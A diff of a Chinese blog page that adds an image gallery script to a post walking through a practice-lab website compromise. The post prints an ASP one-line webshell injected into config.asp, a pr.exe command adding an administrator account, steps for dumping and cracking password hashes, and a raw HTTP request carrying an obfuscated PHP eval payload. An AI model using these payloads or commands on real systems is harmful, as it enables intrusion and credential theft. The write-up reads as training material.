@@ -134,7 +134,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91"><span class="toc-number">1.</span> <span class="toc-text">我很简单，不要欺负我</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.</span> <span class="toc-text">后台管理密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%99%A8%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">获取服务器器管理密码</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">后台管理密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%99%A8%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">获取服务器器管理密码</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -183,7 +183,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="我很简单，不要欺负我"><a href="#我很简单，不要欺负我" class="headerlink" title="我很简单，不要欺负我"></a>我很简单，不要欺负我</h1><blockquote>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="我很简单，不要欺负我"><a href="#我很简单，不要欺负我" class="headerlink" title="我很简单，不要欺负我"></a>我很简单，不要欺负我</h1><blockquote>
 <ol>
 <li>获取网站后台密码   </li>
 <li>提取权限</li>
@@ -192,7 +192,7 @@
 </blockquote>
 <h2 id="后台管理密码获取"><a href="#后台管理密码获取" class="headerlink" title="后台管理密码获取"></a>后台管理密码获取</h2><p>到处都是注入点 会用注入工具就能注入出账号密码了比如<strong>Domain</strong> /<strong>阿D</strong>/<strong>Pangolin</strong>/甚至是神器<strong>sqlmap</strong>都可以解决<br>详细过程我就跳过了 没什么意思 </p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到账号密码后 应该是找后台的登陆页面<br>首先可以进行猜测  <code>admin</code> 比如这样就能自动跳出路径了</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01"></a></p>
 <p>进入后台后 应该是要想办法拿到shell<br>拿到shell方法有很多</p>
 <ol>
 <li>直接上传拿shell</li>
@@ -206,7 +206,7 @@
 <li>修改网站模板</li>
 </ol>
 <p>找不到上传点好痛苦…看到配置文件可以修改 眼睛一亮  正好试试新到手都一句话木马能不能用</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02"></a></p>
 <p>点击左侧的[系统设置管理]→[网站配置信息]，随便找改地方插入一句话就好  如上图<br>之后用菜刀连接  我这里一句话是chr(97))  97是a的Ascii码 所以一句话密码是a<br><code>http://www.test.inchunqiu/inc/config.asp</code>这是连接地址<br>解释一下为什么是这里<br>/nc/config.asp 源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Const SiteName&#x3D;&quot;魅力企业网站管理系统 2007 中英繁商业正式版&quot;        &#39;网站名称</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;网站名称</span><br><span class="line">Const SiteTitle&#x3D;&quot;魅力软件&quot;        &#39;网站标题</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;网站标题</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;网站地址</span><br><span class="line">Const Miibeian&#x3D;&quot;湘ICP备05011184号&quot;        &#39;网站备案号</span><br><span class="line">….</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 <p>构造一句话木马</p>
@@ -217,29 +217,29 @@
 <p>整理规范以后</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Const SiteName&#x3D;&quot;&quot;%&gt;</span><br><span class="line">&lt;%Eval Request(Chr(35))%&gt;</span><br><span class="line">&lt;% &#39;&quot;        &#39;网站名称</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;网站名称</span><br><span class="line">Const SiteTitle&#x3D;&quot;魅力软件&quot;        &#39;网站标题</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;网站标题</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;网站地址</span><br><span class="line">Const Miibeian&#x3D;&quot;湘ICP备05011184号&quot;        &#39;网站备案号</span><br><span class="line">….</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 <p>所以插入一句话木马一定是要保证语法正确才能连接成功 所以一定要注意闭合<br>用菜刀连接刚刚的地址</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03"></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03"></a></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04"></a></p>
 <p>在这里上传 提权都工具  这里我选择使用<code>Pr</code></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05"></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05"></a></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07"></a></p>
 <p>上传成功后 右键<code>cmd.exe</code> 使用虚拟终端连接</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06"></a></p>
 <p>之后可以开始提权了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user hacker 123 &#x2F;add &amp; net localgroup administrators hacker &#x2F;add&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08"></a></p>
 <p>看图的左下角 已经将<code>swing</code>这个账号加入到管理员组了 之后用3389连接就好了<br>打开[开始]→[运行]→输入<strong>mstsc</strong>连接到目标机就好了 (目标机IP可以在场景拓扑图里看到)<br>在这之前先打开 3389<br><code>pr 3389</code></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09"></a></p>
 <p>连接到目标机</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10"></a></p>
 <h2 id="获取服务器器管理密码"><a href="#获取服务器器管理密码" class="headerlink" title="获取服务器器管理密码"></a>获取服务器器管理密码</h2><p>这里我选择用<code>QuarksPwDum</code> 对Hash的获取</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11"></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12"></p>
-<p>使用图中的命令 打开工具<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13"></p>
-<p>成功打开<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11"></a></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12"></a></p>
+<p>使用图中的命令 打开工具<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13"></a></p>
+<p>成功打开<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14"></a></p>
 <p>使用命令获取hash</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15"></a></p>
 <p>成功获取hash 接下来要对hash进行解密 比如 [这个连接</p>
-<p>](<a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a>)<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16"></p>
+<p>](<a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16"></a></p>
 <p><strong>Good 这样就解决啦!!!</strong>  鼓掌一下</p>
 <p>POST /utility/convert/index.php?a=config&amp;source=d7.2_x2.0 HTTP/1.1</p>
 <p>Host: <a href="http://www.test.ichunqiu/">www.test.ichunqiu</a></p>
@@ -251,7 +251,12 @@
 <p>Content-Length: 199</p>
 <p>Content-Type: application/x-www-form-urlencoded</p>
 <p>newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&amp;submit=yes</p>
-
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -288,7 +293,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91"><span class="toc-number">1.</span> <span class="toc-text">我很简单，不要欺负我</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.</span> <span class="toc-text">后台管理密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%99%A8%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">获取服务器器管理密码</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">后台管理密码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%99%A8%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">获取服务器器管理密码</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
